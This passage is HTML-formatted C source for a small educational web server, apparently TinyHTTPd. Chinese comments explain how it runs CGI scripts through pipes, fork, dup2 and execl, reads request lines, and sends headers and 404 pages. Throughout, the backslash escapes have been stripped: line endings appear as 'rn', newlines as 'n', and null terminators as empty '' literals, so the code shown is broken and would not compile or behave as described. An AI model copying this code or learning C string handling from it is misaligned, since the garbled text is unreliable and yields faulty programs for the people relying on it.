/>&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;&lt;P&gt;Error&nbsp;prohibited&nbsp;CGI&nbsp;execution.rn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />}<br />&nbsp;<br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#0088ff;font-weight:400">/*&nbsp;Print&nbsp;out&nbsp;an&nbsp;error&nbsp;message&nbsp;with&nbsp;perror()&nbsp;(for&nbsp;system&nbsp;errors;&nbsp;based<br />&nbsp;*&nbsp;on&nbsp;value&nbsp;of&nbsp;errno,&nbsp;which&nbsp;indicates&nbsp;system&nbsp;call&nbsp;errors)&nbsp;and&nbsp;exit&nbsp;the<br />&nbsp;*&nbsp;program&nbsp;indicating&nbsp;an&nbsp;error.&nbsp;*/</span><br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;error_die(<span style="color:#7f0044;font-weight:400">const</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*sc)<br />{<br />&nbsp;perror(sc);<br />&nbsp;exit(<span style="color:#ff0044;font-weight:400">1</span>);<br />}<br />&nbsp;<br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#0088ff;font-weight:400">/*&nbsp;Execute&nbsp;a&nbsp;CGI&nbsp;script.&nbsp;&nbsp;Will&nbsp;need&nbsp;to&nbsp;set&nbsp;environment&nbsp;variables&nbsp;as<br />&nbsp;*&nbsp;appropriate.<br />&nbsp;*&nbsp;Parameters:&nbsp;client&nbsp;socket&nbsp;descriptor<br />&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;path&nbsp;to&nbsp;the&nbsp;CGI&nbsp;script&nbsp;*/</span><br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#0088ff;font-weight:400">//执行cgi动态解析</span><br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;execute_cgi(<span style="color:#7f0044;font-weight:400">int</span>&nbsp;client,&nbsp;<span style="color:#7f0044;font-weight:400">const</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*path,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">const</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*method,&nbsp;<span style="color:#7f0044;font-weight:400">const</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*query_string)<br />{<br />&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buf[<span style="color:#ff0044;font-weight:400">1024</span>];<br />&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;cgi_output[<span style="color:#ff0044;font-weight:400">2</span>];<span style="color:#0088ff;font-weight:400">//声明的读写管道，切莫被名称给忽悠，会给出图进行说明</span><br />&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;cgi_input[<span style="color:#ff0044;font-weight:400">2</span>];<span style="color:#0088ff;font-weight:400">//</span><br />&nbsp;pid_t&nbsp;pid;<br />&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;status;<br />&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;i;<br />&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;c;<br />&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;numchars&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1</span>;<br />&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;content_length&nbsp;=&nbsp;-<span style="color:#ff0044;font-weight:400">1</span>;<br />&nbsp;<br />&nbsp;buf[<span style="color:#ff0044;font-weight:400">0</span>]&nbsp;=&nbsp;<span style="color:#00117f;font-weight:400">&#39;A&#39;</span>;&nbsp;buf[<span style="color:#ff0044;font-weight:400">1</span>]&nbsp;=&nbsp;&#39;&#39;;<br />&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(strcasecmp(method,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;GET&quot;</span>)&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)<br />&nbsp;<span style="color:#0088ff;font-weight:400">//如果是GET请求</span><br />&nbsp;<span style="color:#0088ff;font-weight:400">//读取并且丢弃头信息</span><br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;((numchars&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;&amp;&amp;&nbsp;strcmp(<span style="color:#3ad900;font-weight:400">&quot;n&quot;</span>,&nbsp;buf))<br />&nbsp;&nbsp;&nbsp;numchars&nbsp;=&nbsp;get_line(client,&nbsp;buf,&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(buf));<br />&nbsp;<span style="color:#ff9d00;font-weight:700">else</span>&nbsp;&nbsp;<br />&nbsp;{<br />&nbsp;<span style="color:#0088ff;font-weight:400">//处理的请求为POST</span><br />&nbsp;&nbsp;numchars&nbsp;=&nbsp;get_line(client,&nbsp;buf,&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(buf));<br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;((numchars&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;&amp;&amp;&nbsp;strcmp(<span style="color:#3ad900;font-weight:400">&quot;n&quot;</span>,&nbsp;buf))<br />&nbsp;&nbsp;{<span style="color:#0088ff;font-weight:400">//循环读取头信息找到Content-Length字段的值</span><br />&nbsp;&nbsp;&nbsp;buf[<span style="color:#ff0044;font-weight:400">15</span>]&nbsp;=&nbsp;&#39;&#39;;<span style="color:#0088ff;font-weight:400">//目的是为了截取Content-Length:</span><br />&nbsp;<br />&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(strcasecmp(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;Content-Length:&quot;</span>)&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&quot;Content-Length:&nbsp;15&quot;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;content_length&nbsp;=&nbsp;atoi(&amp;(buf[<span style="color:#ff0044;font-weight:400">16</span>]));<span style="color:#0088ff;font-weight:400">//获取Content-Length的值</span><br />&nbsp;&nbsp;&nbsp;numchars&nbsp;=&nbsp;get_line(client,&nbsp;buf,&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(buf));<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(content_length&nbsp;==&nbsp;-<span style="color:#ff0044;font-weight:400">1</span>)&nbsp;{<br />&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//错误请求</span><br />&nbsp;&nbsp;&nbsp;bad_request(client);<br />&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>;<br />&nbsp;&nbsp;}<br />&nbsp;}<br /><span style="color:#0088ff;font-weight:400">//返回正确响应码200</span><br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;HTTP/1.0&nbsp;200&nbsp;OKrn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br /><span style="color:#0088ff;font-weight:400">//#include&lt;unistd.h&gt;</span><br /><span style="color:#0088ff;font-weight:400">//int&nbsp;pipe(int&nbsp;filedes[2]);</span><br /><span style="color:#0088ff;font-weight:400">//返回值：成功，返回0，否则返回-1。参数数组包含pipe使用的两个文件的描述符。fd[0]:读管道，fd[1]:写管道。</span><br /><span style="color:#0088ff;font-weight:400">//必须在fork()中调用pipe()，否则子进程不会继承文件描述符。</span><br /><span style="color:#0088ff;font-weight:400">//两个进程不共享祖先进程，就不能使用pipe。但是可以使用命名管道。</span><br /><span style="color:#0088ff;font-weight:400">//pipe(cgi_output)执行成功后，cgi_output[0]:读通道&nbsp;cgi_output[1]:写通道，这就是为什么说不要被名称所迷惑</span><br />&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(pipe(cgi_output)&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;{<br />&nbsp;&nbsp;cannot_execute(client);<br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>;<br />&nbsp;}<br />&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(pipe(cgi_input)&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;{<br />&nbsp;&nbsp;cannot_execute(client);<br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>;<br />&nbsp;}<br />&nbsp;<br />&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(&nbsp;(pid&nbsp;=&nbsp;fork())&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>&nbsp;)&nbsp;{<br />&nbsp;&nbsp;cannot_execute(client);<br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>;<br />&nbsp;}<br />&nbsp;<span style="color:#0088ff;font-weight:400">//fork出一个子进程运行cgi脚本</span><br />&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(pid&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;子进程:&nbsp;运行CGI&nbsp;脚本&nbsp;*/</span><br />&nbsp;{<br />&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;meth_env[<span style="color:#ff0044;font-weight:400">255</span>];<br />&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;query_env[<span style="color:#ff0044;font-weight:400">255</span>];<br />&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;length_env[<span style="color:#ff0044;font-weight:400">255</span>];<br />&nbsp;<br />&nbsp;&nbsp;dup2(cgi_output[<span style="color:#ff0044;font-weight:400">1</span>],&nbsp;<span style="color:#ff0044;font-weight:400">1</span>);<span style="color:#0088ff;font-weight:400">//1代表着stdout，0代表着stdin，将系统标准输出重定向为cgi_output[1]</span><br />&nbsp;&nbsp;dup2(cgi_input[<span style="color:#ff0044;font-weight:400">0</span>],&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<span style="color:#0088ff;font-weight:400">//将系统标准输入重定向为cgi_input[0]，这一点非常关键，</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//cgi程序中用的是标准输入输出进行交互</span><br />&nbsp;&nbsp;close(cgi_output[<span style="color:#ff0044;font-weight:400">0</span>]);<span style="color:#0088ff;font-weight:400">//关闭了cgi_output中的读通道</span><br />&nbsp;&nbsp;close(cgi_input[<span style="color:#ff0044;font-weight:400">1</span>]);<span style="color:#0088ff;font-weight:400">//关闭了cgi_input中的写通道</span><br />&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//CGI标准需要将请求的方法存储环境变量中，然后和cgi脚本进行交互</span><br />&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//存储REQUEST_METHOD</span><br />&nbsp;&nbsp;sprintf(meth_env,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;REQUEST_METHOD=%s&quot;</span>,&nbsp;method);<br />&nbsp;&nbsp;putenv(meth_env);<br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(strcasecmp(method,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;GET&quot;</span>)&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;{<br />&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//存储QUERY_STRING</span><br />&nbsp;&nbsp;&nbsp;sprintf(query_env,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;QUERY_STRING=%s&quot;</span>,&nbsp;query_string);<br />&nbsp;&nbsp;&nbsp;putenv(query_env);<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">else</span>&nbsp;{&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;POST&nbsp;*/</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//存储CONTENT_LENGTH</span><br />&nbsp;&nbsp;&nbsp;sprintf(length_env,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;CONTENT_LENGTH=%d&quot;</span>,&nbsp;content_length);<br />&nbsp;&nbsp;&nbsp;putenv(length_env);<br />&nbsp;&nbsp;}<br />&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;表头文件#include&lt;unistd.h&gt;</span><br />&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;定义函数</span><br />&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;int&nbsp;execl(const&nbsp;char&nbsp;*&nbsp;path,const&nbsp;char&nbsp;*&nbsp;arg,....);</span><br />&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;函数说明</span><br />&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;execl()用来执行参数path字符串所代表的文件路径，接下来的参数代表执行该文件时传递过去的argv(0)、argv[1]……，最后一个参数必须用空指针(NULL)作结束。</span><br />&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;返回值</span><br />&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;如果执行成功则函数不会返回，执行失败则直接返回-1，失败原因存于errno中。</span><br />&nbsp;&nbsp;execl(path,&nbsp;path,&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>);<span style="color:#0088ff;font-weight:400">//执行CGI脚本</span><br />&nbsp;&nbsp;exit(<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;}&nbsp;<span style="color:#ff9d00;font-weight:700">else</span>&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;父进程&nbsp;*/</span><br />&nbsp;&nbsp;close(cgi_output[<span style="color:#ff0044;font-weight:400">1</span>]);<span style="color:#0088ff;font-weight:400">//关闭了cgi_output中的写通道，注意这是父进程中cgi_output变量和子进程要区分开</span><br />&nbsp;&nbsp;close(cgi_input[<span style="color:#ff0044;font-weight:400">0</span>]);<span style="color:#0088ff;font-weight:400">//关闭了cgi_input中的读通道</span><br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(strcasecmp(method,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;POST&quot;</span>)&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)<br />&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;(i&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;&nbsp;i&nbsp;&lt;&nbsp;content_length;&nbsp;i++)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//开始读取POST中的内容</span><br />&nbsp;&nbsp;&nbsp;&nbsp;recv(client,&nbsp;&amp;c,&nbsp;<span style="color:#ff0044;font-weight:400">1</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//将数据发送给cgi脚本</span><br />&nbsp;&nbsp;&nbsp;&nbsp;write(cgi_input[<span style="color:#ff0044;font-weight:400">1</span>],&nbsp;&amp;c,&nbsp;<span style="color:#ff0044;font-weight:400">1</span>);<br />&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//读取cgi脚本返回数据</span><br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;(read(cgi_output[<span style="color:#ff0044;font-weight:400">0</span>],&nbsp;&amp;c,&nbsp;<span style="color:#ff0044;font-weight:400">1</span>)&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//发送给浏览器</span><br />&nbsp;&nbsp;&nbsp;send(client,&nbsp;&amp;c,&nbsp;<span style="color:#ff0044;font-weight:400">1</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br /><span style="color:#0088ff;font-weight:400">//运行结束关闭</span><br />&nbsp;&nbsp;close(cgi_output[<span style="color:#ff0044;font-weight:400">0</span>]);<br />&nbsp;&nbsp;close(cgi_input[<span style="color:#ff0044;font-weight:400">1</span>]);<br /><span style="color:#0088ff;font-weight:400">//定义函数：pid_t&nbsp;waitpid(pid_t&nbsp;pid,&nbsp;int&nbsp;*&nbsp;status,&nbsp;int&nbsp;options);</span><br /><span style="color:#0088ff;font-weight:400">//函数说明：waitpid()会暂时停止目前进程的执行,&nbsp;直到有信号来到或子进程结束.</span><br /><span style="color:#0088ff;font-weight:400">//如果在调用wait()时子进程已经结束,&nbsp;则wait()会立即返回子进程结束状态值.&nbsp;子进程的结束状态值会由参数status&nbsp;返回,</span><br /><span style="color:#0088ff;font-weight:400">//而子进程的进程识别码也会一快返回.</span><br /><span style="color:#0088ff;font-weight:400">//如果不在意结束状态值,&nbsp;则参数status&nbsp;可以设成NULL.&nbsp;参数pid&nbsp;为欲等待的子进程识别码,&nbsp;其他数值意义如下：</span><br /><span style="color:#0088ff;font-weight:400">//1、pid&lt;-1&nbsp;等待进程组识别码为pid&nbsp;绝对值的任何子进程.</span><br /><span style="color:#0088ff;font-weight:400">//2、pid=-1&nbsp;等待任何子进程,&nbsp;相当于wait().</span><br /><span style="color:#0088ff;font-weight:400">//3、pid=0&nbsp;等待进程组识别码与目前进程相同的任何子进程.</span><br /><span style="color:#0088ff;font-weight:400">//4、pid&gt;0&nbsp;等待任何子进程识别码为pid&nbsp;的子进程.</span><br />&nbsp;&nbsp;waitpid(pid,&nbsp;&amp;status,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;}<br />}<br />&nbsp;<br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#0088ff;font-weight:400">/*&nbsp;Get&nbsp;a&nbsp;line&nbsp;from&nbsp;a&nbsp;socket,&nbsp;whether&nbsp;the&nbsp;line&nbsp;ends&nbsp;in&nbsp;a&nbsp;newline,<br />&nbsp;*&nbsp;carriage&nbsp;return,&nbsp;or&nbsp;a&nbsp;CRLF&nbsp;combination.&nbsp;&nbsp;Terminates&nbsp;the&nbsp;string&nbsp;read<br />&nbsp;*&nbsp;with&nbsp;a&nbsp;null&nbsp;character.&nbsp;&nbsp;If&nbsp;no&nbsp;newline&nbsp;indicator&nbsp;is&nbsp;found&nbsp;before&nbsp;the<br />&nbsp;*&nbsp;end&nbsp;of&nbsp;the&nbsp;buffer,&nbsp;the&nbsp;string&nbsp;is&nbsp;terminated&nbsp;with&nbsp;a&nbsp;null.&nbsp;&nbsp;If&nbsp;any&nbsp;of<br />&nbsp;*&nbsp;the&nbsp;above&nbsp;three&nbsp;line&nbsp;terminators&nbsp;is&nbsp;read,&nbsp;the&nbsp;last&nbsp;character&nbsp;of&nbsp;the<br />&nbsp;*&nbsp;string&nbsp;will&nbsp;be&nbsp;a&nbsp;linefeed&nbsp;and&nbsp;the&nbsp;string&nbsp;will&nbsp;be&nbsp;terminated&nbsp;with&nbsp;a<br />&nbsp;*&nbsp;null&nbsp;character.<br />&nbsp;*&nbsp;Parameters:&nbsp;the&nbsp;socket&nbsp;descriptor<br />&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the&nbsp;buffer&nbsp;to&nbsp;save&nbsp;the&nbsp;data&nbsp;in<br />&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the&nbsp;size&nbsp;of&nbsp;the&nbsp;buffer<br />&nbsp;*&nbsp;Returns:&nbsp;the&nbsp;number&nbsp;of&nbsp;bytes&nbsp;stored&nbsp;(excluding&nbsp;null)&nbsp;*/</span><br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#0088ff;font-weight:400">//解析一行http报文</span><br /><span style="color:#7f0044;font-weight:400">int</span>&nbsp;get_line(<span style="color:#7f0044;font-weight:400">int</span>&nbsp;sock,&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*buf,&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;size)<br />{<br />&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;i&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;<br />&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;c&nbsp;=&nbsp;&#39;&#39;;<br />&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;n;<br />&nbsp;<br />&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;((i&nbsp;&lt;&nbsp;size&nbsp;-&nbsp;<span style="color:#ff0044;font-weight:400">1</span>)&nbsp;&amp;&amp;&nbsp;(c&nbsp;!=&nbsp;<span style="color:#00117f;font-weight:400">&#39;n&#39;</span>))<br />&nbsp;{<br />&nbsp;&nbsp;n&nbsp;=&nbsp;recv(sock,&nbsp;&amp;c,&nbsp;<span style="color:#ff0044;font-weight:400">1</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;DEBUG&nbsp;printf(&quot;%02Xn&quot;,&nbsp;c);&nbsp;*/</span><br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(n&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)<br />&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(c&nbsp;==&nbsp;<span style="color:#00117f;font-weight:400">&#39;r&#39;</span>)<br />&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;n&nbsp;=&nbsp;recv(sock,&nbsp;&amp;c,&nbsp;<span style="color:#ff0044;font-weight:400">1</span>,&nbsp;MSG_PEEK);<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;DEBUG&nbsp;printf(&quot;%02Xn&quot;,&nbsp;c);&nbsp;*/</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;((n&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;&amp;&amp;&nbsp;(c&nbsp;==&nbsp;<span style="color:#00117f;font-weight:400">&#39;n&#39;</span>))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;recv(sock,&nbsp;&amp;c,&nbsp;<span style="color:#ff0044;font-weight:400">1</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">else</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c&nbsp;=&nbsp;<span style="color:#00117f;font-weight:400">&#39;n&#39;</span>;<br />&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;buf[i]&nbsp;=&nbsp;c;<br />&nbsp;&nbsp;&nbsp;i++;<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">else</span><br />&nbsp;&nbsp;&nbsp;c&nbsp;=&nbsp;<span style="color:#00117f;font-weight:400">&#39;n&#39;</span>;<br />&nbsp;}<br />&nbsp;buf[i]&nbsp;=&nbsp;&#39;&#39;;<br />&nbsp;<br />&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>(i);<br />}<br />&nbsp;<br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#0088ff;font-weight:400">/*&nbsp;Return&nbsp;the&nbsp;informational&nbsp;HTTP&nbsp;headers&nbsp;about&nbsp;a&nbsp;file.&nbsp;*/</span><br /><span style="color:#0088ff;font-weight:400">/*&nbsp;Parameters:&nbsp;the&nbsp;socket&nbsp;to&nbsp;print&nbsp;the&nbsp;headers&nbsp;on<br />&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the&nbsp;name&nbsp;of&nbsp;the&nbsp;file&nbsp;*/</span><br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;headers(<span style="color:#7f0044;font-weight:400">int</span>&nbsp;client,&nbsp;<span style="color:#7f0044;font-weight:400">const</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*filename)<br />{<br />&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buf[<span style="color:#ff0044;font-weight:400">1024</span>];<br />&nbsp;(<span style="color:#7f0044;font-weight:400">void</span>)filename;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;could&nbsp;use&nbsp;filename&nbsp;to&nbsp;determine&nbsp;file&nbsp;type&nbsp;*/</span><br /><span style="color:#0088ff;font-weight:400">//发送HTTP头</span><br />&nbsp;strcpy(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;HTTP/1.0&nbsp;200&nbsp;OKrn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;strcpy(buf,&nbsp;SERVER_STRING);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;Content-Type:&nbsp;text/htmlrn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;strcpy(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;rn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />}<br />&nbsp;<br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#0088ff;font-weight:400">/*&nbsp;Give&nbsp;a&nbsp;client&nbsp;a&nbsp;404&nbsp;not&nbsp;found&nbsp;status&nbsp;message.&nbsp;*/</span><br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;not_found(<span style="color:#7f0044;font-weight:400">int</span>&nbsp;client)<br />{<br />&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buf[<span style="color:#ff0044;font-weight:400">1024</span>];<br />&nbsp;<span style="color:#0088ff;font-weight:400">//返回404</span><br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;HTTP/1.0&nbsp;404&nbsp;NOT&nbsp;FOUNDrn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;SERVER_STRING);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;Content-Type:&nbsp;text/htmlrn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;rn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;&lt;HTML&gt;&lt;TITLE&gt;Not&nbsp;Found&lt;/TITLE&gt;rn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;&lt;BODY&gt;&lt;P&gt;The&nbsp;server&nbsp;could&nbsp;not&nbsp;fulfillrn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span 